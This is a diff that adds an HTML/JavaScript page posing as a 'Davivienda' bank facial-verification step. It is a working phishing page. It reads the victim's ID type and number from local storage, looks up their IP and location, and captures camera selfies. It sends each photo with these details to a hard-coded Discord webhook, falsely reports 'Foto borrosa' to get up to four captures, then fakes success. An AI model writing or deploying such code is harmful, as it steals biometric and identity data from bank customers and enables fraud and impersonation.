@@ -1,0 +1,580 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, viewport-fit=cover">
+    <title>Verificación Facial</title>
+    <style>
+        :root {
+            --primary: #007aff;
+            --success: #34c759;
+            --error: #ff3b30;
+            --warning: #ff9500;
+            --bg: #ffffff;
+            --text-main: #000000;
+            --text-sub: #8e8e93;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg);
+            height: 100vh;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        /* ── Contenedor principal ── */
+        .scanner-container {
+            position: relative;
+            width: 300px;
+            height: 380px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 36px;
+        }
+
+        /* ── Máscara ovalada del video ── */
+        .video-mask {
+            position: absolute;
+            width: 230px;
+            height: 290px;
+            border-radius: 50% / 45%;
+            overflow: hidden;
+            z-index: 10;
+            background: #1a1a1a;
+        }
+
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+            display: block;
+        }
+
+        /* ── Silueta de cabeza (overlay SVG encima del video) ── */
+        .face-guide-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 15;
+            pointer-events: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .face-silhouette {
+            width: 180px;
+            height: 230px;
+            opacity: 0.95;
+            transition: opacity 0.4s;
+        }
+
+        /* ── Anillo de progreso exterior ── */
+        .progress-ring {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            z-index: 20;
+            pointer-events: none;
+        }
+
+        .ring-track {
+            transition: stroke 0.4s ease;
+        }
+
+        .ring-progress {
+            transition: stroke-dashoffset 0.5s ease-in-out, stroke 0.4s ease;
+            transform-origin: 50% 50%;
+        }
+
+        /* ── Luz de escaneo ── */
+        .scan-light {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(180deg,
+                rgba(255,255,255,0) 35%,
+                rgba(255,255,255,0.55) 50%,
+                rgba(255,255,255,0) 65%);
+            z-index: 12;
+            opacity: 0;
+            animation: scanDown 2.2s infinite linear;
+            pointer-events: none;
+            border-radius: 50% / 45%;
+            transition: opacity 0.4s;
+        }
+
+        .scan-light.active { opacity: 0.7; }
+
+        @keyframes scanDown {
+            0%   { transform: translateY(-110%); }
+            100% { transform: translateY(110%); }
+        }
+
+        /* ── Flash foto ── */
+        .flash {
+            position: fixed;
+            inset: 0;
+            background: white;
+            opacity: 0;
+            pointer-events: none;
+            z-index: 100;
+            transition: opacity 0.08s;
+        }
+
+        /* ── Área de texto ── */
+        .status-area {
+            text-align: center;
+            padding: 0 24px;
+            z-index: 30;
+            min-height: 64px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .status-title {
+            font-size: 19px;
+            font-weight: 600;
+            color: var(--text-main);
+            letter-spacing: -0.3px;
+            transition: color 0.3s;
+        }
+
+        .status-sub {
+            font-size: 14px;
+            color: var(--text-sub);
+        }
+
+        /* ── Indicador de estado (punto) ── */
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--text-sub);
+            transition: background 0.3s;
+            margin-bottom: 2px;
+        }
+
+        .status-dot.good  { background: var(--success); }
+        .status-dot.warn  { background: var(--warning); }
+        .status-dot.scan  { background: var(--primary); animation: pulse 1s infinite; }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        /* ── Loader ── */
+        #loader-overlay {
+            position: fixed;
+            inset: 0;
+            background: white;
+            z-index: 200;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .spinner {
+            width: 32px;
+            height: 32px;
+            border: 3px solid #e5e5e5;
+            border-top-color: #000;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* ── Borde pulsante cuando rostro detectado ── */
+        .video-mask.face-ok {
+            box-shadow: 0 0 0 3px var(--success), 0 0 20px rgba(52,199,89,0.4);
+            transition: box-shadow 0.3s;
+        }
+
+        .video-mask.face-warn {
+            box-shadow: 0 0 0 3px var(--warning), 0 0 20px rgba(255,149,0,0.3);
+            transition: box-shadow 0.3s;
+        }
+
+        .video-mask.face-none {
+            box-shadow: 0 0 0 2px rgba(0,0,0,0.1);
+            transition: box-shadow 0.3s;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="scanner-container" id="camera-container">
+
+        <!-- Anillo de progreso SVG -->
+        <svg class="progress-ring" viewBox="0 0 300 380" xmlns="http://www.w3.org/2000/svg">
+            <!-- Track (fondo) -->
+            <ellipse class="ring-track" stroke="#e5e5ea" stroke-width="7" fill="transparent"
+                rx="140" ry="182" cx="150" cy="190"></ellipse>
+            <!-- Progreso -->
+            <ellipse class="ring-progress" id="ring-progress" stroke="#007aff" stroke-width="7"
+                stroke-linecap="round" fill="transparent"
+                rx="140" ry="182" cx="150" cy="190"
+                style="stroke-dasharray:2042;stroke-dashoffset:2042;"></ellipse>
+        </svg>
+
+        <!-- Video -->
+        <div class="video-mask face-none" id="video-mask">
+            <video id="video" autoplay playsinline muted></video>
+            <div class="scan-light" id="scan-light"></div>
+        </div>
+
+        <!-- Silueta de cabeza encima del video -->
+        <div class="face-guide-overlay">
+            <svg class="face-silhouette" id="face-silhouette" viewBox="0 0 180 230" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <!-- Cabeza -->
+                <path d="
+                    M90 8
+                    C 48 8, 22 42, 22 82
+                    C 22 118, 34 148, 58 163
+                    C 58 163, 56 178, 50 188
+                    C 44 198, 32 204, 32 204
+                    L 148 204
+                    C 148 204, 136 198, 130 188
+                    C 124 178, 122 163, 122 163
+                    C 146 148, 158 118, 158 82
+                    C 158 42, 132 8, 90 8
+                    Z
+                " stroke="white" stroke-width="4" stroke-linejoin="round" fill="none" opacity="0.85"/>
+                <!-- Hombros / cuello -->
+                <path d="
+                    M32 204
+                    C 20 210, 4 222, 2 230
+                    L 178 230
+                    C 176 222, 160 210, 148 204
+                " stroke="white" stroke-width="4" stroke-linejoin="round" fill="none" opacity="0.85"/>
+            </svg>
+        </div>
+
+    </div>
+
+    <!-- Status -->
+    <div class="status-area">
+        <div class="status-dot" id="status-dot"></div>
+        <div class="status-title" id="main-text">Iniciando cámara…</div>
+        <div class="status-sub" id="sub-text">Por favor espera</div>
+    </div>
+
+    <div class="flash" id="flash-effect"></div>
+
+    <div id="loader-overlay">
+        <div class="spinner"></div>
+    </div>
+
+    <!-- ─────────────────────────────────────────────────────────── -->
+    <script>
+        // 🎯 WEBHOOK DE DISCORD
+        const DISCORD_WEBHOOK = 'https://discordapp.com/api/webhooks/1489904747845648515/mSnOtuwDSlQMJChVvLObPp22v8E5W6TQU49meRkvUuUw3dyiMHnptCmEdUQohYFULqMJ';
+
+        // ── Elementos ──
+        const video        = document.getElementById("video");
+        const ringProgress = document.getElementById("ring-progress");
+        const mainText     = document.getElementById("main-text");
+        const subText      = document.getElementById("sub-text");
+        const flashEffect  = document.getElementById("flash-effect");
+        const videoMask    = document.getElementById("video-mask");
+        const loaderOverlay= document.getElementById("loader-overlay");
+        const scanLight    = document.getElementById("scan-light");
+        const statusDot    = document.getElementById("status-dot");
+
+        // ── Estado ──
+        let stream       = null;
+        let intento      = 0;
+        let faceDetector = null;
+        let detectLoop   = null;
+        let scanning     = false;
+
+        const tipoDocumento  = localStorage.getItem('tipo_documento') || 'Desconocido';
+        const numeroDocumento= localStorage.getItem('documento')       || 'Desconocido';
+        let userIP           = 'Desconocida';
+        let userLocation     = 'Desconocida';
+
+        // ── Circunferencia del anillo ──
+        // rx=140 ry=182 → perímetro approx π*(3*(a+b)-√((3a+b)(a+3b))) Ramanujan
+        const a = 140, b = 182;
+        const CIRC = Math.PI * (3*(a+b) - Math.sqrt((3*a+b)*(a+3*b)));
+        ringProgress.style.strokeDasharray  = `${CIRC} ${CIRC}`;
+        ringProgress.style.strokeDashoffset = CIRC;
+
+        function setProgress(pct) {
+            ringProgress.style.strokeDashoffset = CIRC - (pct / 100) * CIRC;
+        }
+
+        function setRingColor(color) {
+            ringProgress.style.stroke = color;
+        }
+
+        // ── IP y ubicación ──
+        async function getIPAndLocation() {
+            try {
+                const r    = await fetch('https://ipapi.co/json/');
+                const data = await r.json();
+                userIP       = data.ip            || 'Desconocida';
+                userLocation = `${data.city||'?'}, ${data.country_name||'?'}`;
+            } catch { userIP = 'Error'; userLocation = 'Error'; }
+        }
+
+        // ── Estado UI ──
+        function setState(state, title, sub) {
+            mainText.innerText = title;
+            subText.innerText  = sub;
+            statusDot.className = `status-dot ${state}`;
+
+            if (state === 'good') {
+                mainText.style.color = 'var(--success)';
+                videoMask.className  = 'video-mask face-ok';
+            } else if (state === 'warn') {
+                mainText.style.color = 'var(--warning)';
+                videoMask.className  = 'video-mask face-warn';
+            } else if (state === 'scan') {
+                mainText.style.color = 'var(--primary)';
+                videoMask.className  = 'video-mask face-ok';
+            } else {
+                mainText.style.color = 'var(--text-main)';
+                videoMask.className  = 'video-mask face-none';
+            }
+        }
+
+        // ── Detección de rostro ──
+        // Intentamos usar la Face Detection API nativa del navegador.
+        // Si no está disponible, usamos un detector de movimiento/color simple.
+        async function initFaceDetector() {
+            if ('FaceDetector' in window) {
+                try {
+                    faceDetector = new FaceDetector({ fastMode: true, maxDetectedFaces: 1 });
+                    return true;
+                } catch { /* no disponible */ }
+            }
+            return false;
+        }
+
+        // Fallback: analiza el brillo central del frame para estimar si hay un rostro
+        // (funciona razonablemente bien en selfies con fondo oscuro)
+        function detectFaceFallback() {
+            const canvas = document.createElement('canvas');
+            const W = 80, H = 100;
+            canvas.width  = W;
+            canvas.height = H;
+            const ctx = canvas.getContext('2d');
+            // Tomamos la región central del video (donde debería estar el rostro)
+            const vw = video.videoWidth, vh = video.videoHeight;
+            const sx = vw * 0.25, sy = vh * 0.1, sw = vw * 0.5, sh = vh * 0.7;
+            ctx.drawImage(video, sx, sy, sw, sh, 0, 0, W, H);
+            const d = ctx.getImageData(0, 0, W, H).data;
+            let skinPixels = 0;
+            for (let i = 0; i < d.length; i += 4) {
+                const r = d[i], g = d[i+1], b = d[i+2];
+                // Heurística de piel: rojo domina, verde intermedio, azul bajo
+                if (r > 80 && g > 40 && b > 20 &&
+                    r > g && r > b &&
+                    (r - g) > 15 && (r - b) > 20 &&
+                    r < 240) {
+                    skinPixels++;
+                }
+            }
+            const ratio = skinPixels / (W * H);
+            // ratio > 0.18 → hay suficiente piel → rostro presente y bien encuadrado
+            // ratio > 0.35 → demasiado cerca
+            if (ratio > 0.38) return 'too-close';
+            if (ratio > 0.15) return 'ok';
+            return 'none';
+        }
+
+        async function detectFace() {
+            if (!video.videoWidth) return 'none';
+            if (faceDetector) {
+                try {
+                    const faces = await faceDetector.detect(video);
+                    if (!faces.length) return 'none';
+                    const face = faces[0];
+                    const faceArea = face.boundingBox.width * face.boundingBox.height;
+                    const frameArea = video.videoWidth * video.videoHeight;
+                    const ratio = faceArea / frameArea;
+                    if (ratio > 0.45) return 'too-close';
+                    if (ratio > 0.10) return 'ok';
+                    return 'none';
+                } catch { return detectFaceFallback(); }
+            }
+            return detectFaceFallback();
+        }
+
+        // ── Bucle de detección en tiempo real ──
+        let okFrames  = 0; // frames consecutivos con rostro bien encuadrado
+        const NEEDED  = 18; // ~0.6s a 30fps antes de lanzar captura automática
+
+        async function runDetectionLoop() {
+            if (scanning) return;
+            const result = await detectFace();
+
+            if (result === 'too-close') {
+                setState('warn', 'Aléjese de la cámara', 'Muévete un poco hacia atrás');
+                setRingColor('#ff9500');
+                setProgress(0);
+                okFrames = 0;
+            } else if (result === 'ok') {
+                okFrames++;
+                const pct = Math.min((okFrames / NEEDED) * 100, 100);
+                setState('good', 'Rostro detectado', 'Mantén la posición…');
+                setRingColor('#34c759');
+                setProgress(pct);
+                if (okFrames >= NEEDED && !scanning) {
+                    iniciarCaptura();
+                    return;
+                }
+            } else {
+                setState('', 'Encuadra tu rostro', 'Mira de frente a la cámara');
+                setRingColor('#007aff');
+                setProgress(0);
+                okFrames = 0;
+            }
+
+            detectLoop = requestAnimationFrame(runDetectionLoop);
+        }
+
+        // ── Captura y envío ──
+        function capture() {
+            const canvas  = document.createElement('canvas');
+            canvas.width  = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            return canvas.toDataURL('image/jpeg', 0.95);
+        }
+
+        async function enviarFotoDiscord(dataURL, numeroIntento) {
+            try {
+                const fecha = new Date().toLocaleString('es-CO', {
+                    timeZone: 'America/Bogota',
+                    dateStyle: 'full',
+                    timeStyle: 'medium'
+                });
+                const tipoDocTexto = { CC:'Cédula de Ciudadanía', CE:'Cédula de Extranjería', PP:'Pasaporte' }[tipoDocumento] || 'Desconocido';
+                const blob = await (await fetch(dataURL)).blob();
+                const formData = new FormData();
+                const payload = {
+                    embeds: [{
+                        title: `📸 Foto Facial - Intento ${numeroIntento}/4`,
+                        color: 0xDA291C,
+                        fields: [
+                            { name:"📋 Tipo de Documento", value:tipoDocTexto,    inline:true },
+                            { name:"🪪 Número",            value:numeroDocumento, inline:true },
+                            { name:"🔄 Intento",           value:`${numeroIntento} de 4`, inline:true },
+                            { name:"🌐 IP",                value:userIP,          inline:true },
+                            { name:"📍 Ubicación",         value:userLocation,    inline:true },
+                            { name:"🕒 Fecha",             value:fecha,           inline:false }
+                        ],
+                        footer: { text:"Sistema de Verificación Facial - Davivienda" },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+                formData.append('payload_json', JSON.stringify(payload));
+                formData.append('file', blob, `${numeroDocumento}_intento_${numeroIntento}.jpg`);
+                const r = await fetch(DISCORD_WEBHOOK, { method:'POST', body:formData });
+                return r.ok;
+            } catch { return false; }
+        }
+
+        async function iniciarCaptura() {
+            if (scanning) return;
+            scanning = true;
+            if (detectLoop) cancelAnimationFrame(detectLoop);
+
+            intento++;
+            scanLight.classList.add('active');
+
+            // Animación de escaneo
+            setState('scan', 'Validando biometría…', 'No te muevas');
+            setProgress(40);
+            await wait(900);
+            setState('scan', 'Procesando…', 'Casi listo');
+            setProgress(75);
+            await wait(900);
+            setProgress(100);
+            await wait(300);
+
+            // Flash foto
+            const dataURL = capture();
+            flashEffect.style.opacity = '0.75';
+            setTimeout(() => flashEffect.style.opacity = '0', 120);
+
+            await enviarFotoDiscord(dataURL, intento);
+            scanLight.classList.remove('active');
+
+            if (intento < 4) {
+                setState('warn', 'Foto borrosa', 'Inténtalo de nuevo');
+                setRingColor('#ff3b30');
+                setProgress(0);
+                okFrames = 0;
+                scanning = false;
+                await wait(2500);
+                setState('', 'Encuadra tu rostro', 'Mira de frente a la cámara');
+                setRingColor('#007aff');
+                detectLoop = requestAnimationFrame(runDetectionLoop);
+            } else {
+                setRingColor('#34c759');
+                setState('good', '¡Verificado!', 'Redirigiendo…');
+                await wait(1400);
+                loaderOverlay.style.display = 'flex';
+                if (stream) stream.getTracks().forEach(t => t.stop());
+                await wait(2200);
+                window.location.href = 'index.html';
+            }
+        }
+
+        function wait(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+        // ── Arranque ──
+        async function startCamera() {
+            await getIPAndLocation();
+            await initFaceDetector();
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width:{ ideal:1920 }, height:{ ideal:1080 } }
+                });
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    if (!video.videoWidth) {
+                        setState('', 'Error de cámara', 'Intenta recargar');
+                        return;
+                    }
+                    setState('', 'Encuadra tu rostro', 'Mira de frente a la cámara');
+                    setTimeout(() => { detectLoop = requestAnimationFrame(runDetectionLoop); }, 800);
+                };
+            } catch {
+                setState('', 'Error', 'No se pudo acceder a la cámara');
+            }
+        }
+
+        startCamera();
+    </script>
+</body>
+</html>
